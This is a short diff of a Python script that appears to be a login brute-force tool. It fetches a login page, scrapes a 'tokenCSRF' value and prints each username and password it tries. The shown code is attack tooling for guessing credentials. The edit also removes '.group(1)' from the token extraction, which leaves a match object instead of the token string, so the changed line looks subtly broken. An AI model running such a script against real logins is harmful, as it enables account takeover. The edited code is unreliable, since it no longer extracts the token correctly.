@@ -5,7 +5,7 @@ from sys import argv
 def force(target_url, username, password):
     session = Session()
     login_page = session.get(target_url)
-    csrf_token = search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
+    csrf_token = search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text)
     
     print(f"[*] Trying : {username}:{password}")
 
